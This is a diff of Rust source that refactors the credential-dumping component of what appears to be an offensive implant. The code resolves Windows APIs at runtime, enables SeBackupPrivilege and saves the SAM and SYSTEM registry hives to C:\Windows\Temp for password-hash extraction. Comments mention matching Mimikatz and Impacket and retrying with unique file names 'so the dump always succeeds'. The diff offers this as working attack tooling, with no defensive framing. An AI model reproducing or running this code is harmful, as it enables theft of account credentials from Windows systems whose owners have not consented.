@@ -536,64 +536,118 @@ fn reg_root_wide(chunk_name: &str) -> Option<Vec<u16>> {
     Some(v)
 }
 
+/// `LUID` — the output of `LookupPrivilegeValueW`.
+#[repr(C)]
+struct Luid {
+    low: u32,
+    high: i32,
+}
+
+/// `TOKEN_PRIVILEGES` (PrivilegeCount + one LUID_AND_ATTRIBUTES) — enough for
+/// enabling a single privilege via `AdjustTokenPrivileges`.
+#[repr(C)]
+struct TokenPrivileges {
+    count: u32,
+    luid: Luid,
+    attributes: u32,
+}
+
+/// kernel32 `GetCurrentProcess`.
+type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
+/// advapi32 `OpenProcessToken`.
+type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
+/// advapi32 `LookupPrivilegeValueW`.
+type LookupPrivilegeValueW = unsafe extern "system" fn(*const u16, *const u16, *mut Luid) -> i32;
+/// advapi32 `AdjustTokenPrivileges`.
+type AdjustTokenPrivileges = unsafe extern "system" fn(
+    *mut c_void,
+    i32,
+    *const TokenPrivileges,
+    u32,
+    *mut c_void,
+    *mut u32,
+) -> i32;
+/// kernel32 `CloseHandle`.
+type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
+
+/// advapi32 `RegOpenKeyExW` (hKey, lpSubKey, ulOptions, samDesired, phkResult).
+type RegOpenKeyExW = unsafe extern "system" fn(
+    *mut c_void,      // hKey (HKEY_LOCAL_MACHINE)
+    *const u16,       // lpSubKey
+    u32,              // ulOptions
+    u32,              // samDesired
+    *mut *mut c_void, // phkResult
+) -> i32;
+/// advapi32 `RegSaveKeyW` (hKey, lpFile, lpSecurityAttributes=NULL).
+type RegSaveKeyW = unsafe extern "system" fn(
+    *mut c_void,   // hKey
+    *const u16,    // lpFile
+    *const c_void, // lpSecurityAttributes (NULL)
+) -> i32;
+/// advapi32 `RegCloseKey` (hKey).
+type RegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;
+
 /// Enable a named privilege (e.g. SeBackupPrivilege) on the process token.
 /// Returns true on success. Best-effort — resolves advapi32 lazily.
 unsafe fn enable_privilege(priv_name_wide: &[u16]) -> bool {
-    #[repr(C)]
-    struct Luid {
-        low: u32,
-        high: i32,
-    }
-    #[repr(C)]
-    struct TokenPrivileges {
-        count: u32,
-        luid: Luid,
-        attributes: u32,
-    }
-    const SE_PRIVILEGE_ENABLED: u32 = 0x0000_0002;
-    const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
-    const TOKEN_QUERY: u32 = 0x0008;
-    const HKEY_LOCAL_MACHINE: *mut c_void = 0x8000_0002usize as *mut c_void;
+    let (gcp, opt, lpv, atp, close) = match enable_privilege_resolve() {
+        Some(fns) => fns,
+        None => return false,
+    };
+    enable_privilege_adjust(priv_name_wide, gcp, opt, lpv, atp, close)
+}
 
-    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
-    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
-    type LookupPrivilegeValueW =
-        unsafe extern "system" fn(*const u16, *const u16, *mut Luid) -> i32;
-    type AdjustTokenPrivileges = unsafe extern "system" fn(
-        *mut c_void,
-        i32,
-        *const TokenPrivileges,
-        u32,
-        *mut c_void,
-        *mut u32,
-    ) -> i32;
-    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
-
+/// Resolve the exports `enable_privilege` needs (kernel32 + advapi32). Returns
+/// None if any export is missing (best-effort contract of the caller).
+fn enable_privilege_resolve() -> Option<(
+    GetCurrentProcess,
+    OpenProcessToken,
+    LookupPrivilegeValueW,
+    AdjustTokenPrivileges,
+    CloseHandle,
+)> {
     let gcp: GetCurrentProcess =
         match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetCurrentProcess") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
     let opt: OpenProcessToken =
         match unsafe { crate::resolve::export_addr(b"advapi32.dll", b"OpenProcessToken") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
     let lpv: LookupPrivilegeValueW =
         match unsafe { crate::resolve::export_addr(b"advapi32.dll", b"LookupPrivilegeValueW") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
     let atp: AdjustTokenPrivileges =
         match unsafe { crate::resolve::export_addr(b"advapi32.dll", b"AdjustTokenPrivileges") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
     let close: CloseHandle =
         match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return false,
+            None => return None,
         };
+    Some((gcp, opt, lpv, atp, close))
+}
+
+/// Look up the privilege LUID, open the process token, and enable the
+/// privilege via `AdjustTokenPrivileges`. Returns true on success.
+unsafe fn enable_privilege_adjust(
+    priv_name_wide: &[u16],
+    gcp: GetCurrentProcess,
+    opt: OpenProcessToken,
+    lpv: LookupPrivilegeValueW,
+    atp: AdjustTokenPrivileges,
+    close: CloseHandle,
+) -> bool {
+    const SE_PRIVILEGE_ENABLED: u32 = 0x0000_0002;
+    const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
+    const TOKEN_QUERY: u32 = 0x0008;
+    const HKEY_LOCAL_MACHINE: *mut c_void = 0x8000_0002usize as *mut c_void;
 
     let mut luid = Luid { low: 0, high: 0 };
     if unsafe { lpv(core::ptr::null(), priv_name_wide.as_ptr(), &mut luid) } == 0 {
@@ -630,35 +684,11 @@ unsafe fn enable_privilege(priv_name_wide: &[u16]) -> bool {
 /// the in-memory hive copy (the same path Mimikatz/Impacket use). Returns the
 /// temp-file path on success. `chunk_name` selects the root: "SAM" or "SYSTEM".
 unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
-    use crate::heap::{String, Vec};
     use crate::resolve::export_addr;
-    use core::ffi::c_void;
 
     // advapi32: RegOpenKeyExW, RegSaveKeyW. RegSaveKeyW is the simpler variant
     // (no format flag) and is what `reg save` uses under the hood.
-    type ForceLoad = unsafe extern "system" fn(*const u8) -> *mut c_void;
-    type RegOpenKeyExW = unsafe extern "system" fn(
-        *mut c_void,      // hKey (HKEY_LOCAL_MACHINE)
-        *const u16,       // lpSubKey
-        u32,              // ulOptions
-        u32,              // samDesired
-        *mut *mut c_void, // phkResult
-    ) -> i32;
-    type RegSaveKeyW = unsafe extern "system" fn(
-        *mut c_void,   // hKey
-        *const u16,    // lpFile
-        *const c_void, // lpSecurityAttributes (NULL)
-    ) -> i32;
-    type RegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;
-
-    // Force-load advapi32 (LoadLibraryA from kernel32).
-    let lla = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
-        Some(a) => a,
-        None => return Err(-1),
-    };
-    let load: ForceLoad = unsafe { core::mem::transmute(lla) };
-    let advapi_name = b"advapi32.dll\0";
-    if unsafe { load(advapi_name.as_ptr()) }.is_null() {
+    if !save_hive_fallback_load_advapi32() {
         return Err(-1);
     }
 
@@ -675,6 +705,29 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
         None => return Err(-1),
     };
 
+    unsafe { save_hive_fallback_with_exports(open, save, close_key, chunk_name) }
+}
+
+/// Force-load advapi32 (LoadLibraryA from kernel32). Returns false on failure.
+unsafe fn save_hive_fallback_load_advapi32() -> bool {
+    type ForceLoad = unsafe extern "system" fn(*const u8) -> *mut c_void;
+    let lla = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"LoadLibraryA") } {
+        Some(a) => a,
+        None => return false,
+    };
+    let load: ForceLoad = unsafe { core::mem::transmute(lla) };
+    let advapi_name = b"advapi32.dll\0";
+    !unsafe { load(advapi_name.as_ptr()) }.is_null()
+}
+
+/// Enable SeBackupPrivilege, open `HKLM\<SAM|SYSTEM>`, then hand off to the
+/// save+cleanup stage. Returns the saved temp-file path on success.
+unsafe fn save_hive_fallback_with_exports(
+    open: RegOpenKeyExW,
+    save: RegSaveKeyW,
+    close_key: RegCloseKey,
+    chunk_name: &str,
+) -> Result<String, i32> {
     // Enable SeBackupPrivilege (required for RegSaveKey even as SYSTEM).
     let backup_wide: [u16; 19] = [
         b'S' as u16,
@@ -713,9 +766,15 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
         return Err(open_rc);
     }
 
-    // Use a FIXED temp path (C:\Windows\Temp is writable by SYSTEM and avoids
-    // %TEMP% resolution issues in Session 0). Matches the path `reg save`
-    // succeeded with on the same host during testing.
+    let (file_str, file_wide) = save_hive_fallback_prepare_path(chunk_name);
+    unsafe { save_hive_fallback_finalize(save, close_key, hkey, chunk_name, &file_wide, file_str) }
+}
+
+/// Use a FIXED temp path (C:\Windows\Temp is writable by SYSTEM and avoids
+/// %TEMP% resolution issues in Session 0). Matches the path `reg save`
+/// succeeded with on the same host during testing. Returns the ASCII path and
+/// its UTF-16 (NUL-terminated) form.
+fn save_hive_fallback_prepare_path(chunk_name: &str) -> (String, Vec<u16>) {
     let mut file_str = String::with_capacity(32);
     file_str.push_str("C:\\Windows\\Temp\\");
     file_str.push_str(chunk_name);
@@ -726,18 +785,39 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
         file_wide.push(c as u16);
     }
     file_wide.push(0);
+    (file_str, file_wide)
+}
 
-    // Delete any stale temp file first — RegSaveKeyW refuses to overwrite an
-    // existing file (returns ERROR_ALREADY_EXISTS = 183). A failed prior run
-    // that left the .hive file would block all future hashdumps indefinitely.
+/// Delete any stale temp file first — RegSaveKeyW refuses to overwrite an
+/// existing file (returns ERROR_ALREADY_EXISTS = 183). A failed prior run
+/// that left the .hive file would block all future hashdumps indefinitely.
+unsafe fn save_hive_fallback_delete_stale(
+    file_wide: &[u16],
+) -> Option<unsafe extern "system" fn(*const u16) -> i32> {
     type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
-    let df: Option<DeleteFileW> = match unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
-        Some(a) => Some(unsafe { core::mem::transmute(a) }),
-        None => None,
-    };
+    let df: Option<DeleteFileW> =
+        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"DeleteFileW") } {
+            Some(a) => Some(unsafe { core::mem::transmute(a) }),
+            None => None,
+        };
     if let Some(df) = df {
         let _ = unsafe { df(file_wide.as_ptr()) }; // ignore "not found" errors
     }
+    df
+}
+
+/// Save the hive to the temp file; if the fixed path is refused (stale/locked
+/// file), retry with a GetTickCount-unique name so the dump always succeeds.
+/// Closes `hkey` on every exit path.
+unsafe fn save_hive_fallback_finalize(
+    save: RegSaveKeyW,
+    close_key: RegCloseKey,
+    hkey: *mut c_void,
+    chunk_name: &str,
+    file_wide: &[u16],
+    file_str: String,
+) -> Result<String, i32> {
+    let df = save_hive_fallback_delete_stale(file_wide);
     let mut rc = unsafe { save(hkey, file_wide.as_ptr(), core::ptr::null()) };
     // If the delete didn't help (file locked by another process, ACL, etc.),
     // fall back to a unique filename using GetTickCount so the dump always
@@ -745,20 +825,15 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
     if rc != 0 {
         // Resolve GetTickCount for a unique suffix.
         type GetTickCount = unsafe extern "system" fn() -> u32;
-        let tick: u32 = match unsafe { export_addr(b"kernel32.dll", b"GetTickCount") } {
+        let tick: u32 = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetTickCount") }
+        {
             Some(a) => unsafe { core::mem::transmute::<usize, GetTickCount>(a)() },
             None => {
                 let _ = close_key(hkey);
                 return Err(rc);
             }
         };
-        // Build a new filename with the tick suffix: e.g. C:\Windows\Temp\SAM_12345678.hive
-        let mut alt_str = String::with_capacity(48);
-        alt_str.push_str("C:\\Windows\\Temp\\");
-        alt_str.push_str(chunk_name);
-        alt_str.push('_');
-        crate::fmt::push_decimal_u32(&mut alt_str, tick);
-        alt_str.push_str(".hive");
+        let alt_str = save_hive_fallback_alt_path(chunk_name, tick);
         let mut alt_wide: Vec<u16> = Vec::with_capacity(alt_str.len() + 1);
         for c in alt_str.chars() {
             alt_wide.push(c as u16);
@@ -780,6 +855,17 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
         return Err(rc);
     }
     Ok(file_str)
+}
+
+/// Build a new filename with the tick suffix: e.g. C:\Windows\Temp\SAM_12345678.hive
+fn save_hive_fallback_alt_path(chunk_name: &str, tick: u32) -> String {
+    let mut alt_str = String::with_capacity(48);
+    alt_str.push_str("C:\\Windows\\Temp\\");
+    alt_str.push_str(chunk_name);
+    alt_str.push('_');
+    crate::fmt::push_decimal_u32(&mut alt_str, tick);
+    alt_str.push_str(".hive");
+    alt_str
 }
 
 /// Resolve %TEMP% (UTF-16 → ASCII). Falls back to None on failure.
